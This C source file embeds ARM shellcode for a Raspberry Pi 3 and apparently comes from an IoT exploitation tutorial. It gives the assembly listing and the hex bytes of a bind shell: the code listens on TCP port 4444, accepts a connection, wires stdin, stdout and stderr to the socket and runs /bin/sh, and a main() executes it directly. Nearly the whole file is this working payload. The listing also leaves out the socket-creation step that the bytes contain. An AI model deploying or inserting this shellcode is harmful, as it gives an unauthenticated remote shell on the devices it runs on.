/*

##################################
# Andrea Sindoni - @invictus1306 #
##################################

This schellcode is part of my episodes:
- ARM exploitation for IoT - https://quequero.org/2017/07/arm-exploitation-iot-episode-2/

Enviroment: Raspberry pi 3

Default settings for port:4444

@.syntax unified
.global _start
_start:

  mov r1, #0x5C           @ r1=0x5c
  mov r5, #0x11           @ r5=0x11
  mov r1, r1, lsl #24     @ r1=0x5c000000
  add r1, r1, r5, lsl #16 @ r1=0x5c110000 - port number=4444(0x115C) --- Please change me
  add r1, #2              @ r1=0x5c110002 - sin_family+sin_port
  sub r2, r2, r2          @ sin_addr
  push {r1, r2}           @ push into the stack r1 and r2
  mov r1, sp              @ save pointer to sockaddr_in struct
  mov r2, #0x10           @ addrlen
  mov r0, r6              @ mov sockfd into r0
  ldr r7, =#282           @ bind syscall
  swi 0

  @ listen for incoming connections via SYS_LISTEN
  @ int listen(int sockfd, int backlog);

  mov r0, r6    @ mov sockfd into r0
  mov r1, #1    @ backlog=1
  ldr r7, =#284 @ listen syscall
  swi 0

  @ Accept connections
  @ int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)

  mov r0, r6     @ mov sockfd into r0
  sub r1, r1, r1 @ addr=0
  sub r2, r2, r2 @ addrlen=0
  ldr r7, =#285  @ accept syscall
  swi 0

  @ Redirect stdin, stdout and stderr via dup2

  mov r1, #2       @ counter stdin(0), stdout(1) and stderr(2)
  loop:
    mov r7, #63    @ dup2 syscall
    swi 0
    sub r1, r1, #1 @ decrement counter
    cmp r1, #-1    @ compare r1 with -1
    bne loop       @ if the result is not equal jmp to loop

  @ int execve(const char *filename, char *const argv[],char *const envp[]);
  mov r0, pc
  add r0, #32
  sub r2, r2, r2
  push {r0, r2}
  mov r1, sp
  mov r7, #11
  swi 0

_exit:
  mov r0, #0
  mov r7, #1
  swi 0  @ exit(0)

.asciz "/bin/sh"

Assemble and link it:
as -o bind.o bind.s
ld -o bind bind.o
*/

#include <stdio.h>

char *code="\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x00\x20\xa0\xe3\xa0\x70\x9f\xe5\x00\x00\x00\xef\x00\x60\xa0\xe1\x5c\x10\xa0\xe3\x11\x50\xa0\xe3\x01\x1c\xa0\xe1\x05\x18\x81\xe0\x02\x10\x81\xe2\x02\x20\x42\xe0\x06\x00\x2d\xe9\x0d\x10\xa0\xe1\x10\x20\xa0\xe3\x06\x00\xa0\xe1\x70\x70\x9f\xe5\x00\x00\x00\xef\x06\x00\xa0\xe1\x01\x10\xa0\xe3\x47\x7f\xa0\xe3\x00\x00\x00\xef\x06\x00\xa0\xe1\x01\x10\x41\xe0\x02\x20\x42\xe0\x50\x70\x9f\xe5\x00\x00\x00\xef\x02\x10\xa0\xe3\x3f\x70\xa0\xe3\x00\x00\x00\xef\x01\x10\x41\xe2\x01\x00\x71\xe3\xfa\xff\xff\x1a\x0f\x00\xa0\xe1\x20\x00\x80\xe2\x02\x20\x42\xe0\x05\x00\x2d\xe9\x0d\x10\xa0\xe1\x0b\x70\xa0\xe3\x00\x00\x00\xef\x00\x00\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef\x2f\x62\x69\x6e\x2f\x73\x68\x00\x19\x01\x00\x00\x1a\x01\x00\x00\x1d\x01\x00\x00";

int main(void) {

  (*(void(*)()) code)();

  return 0;

}
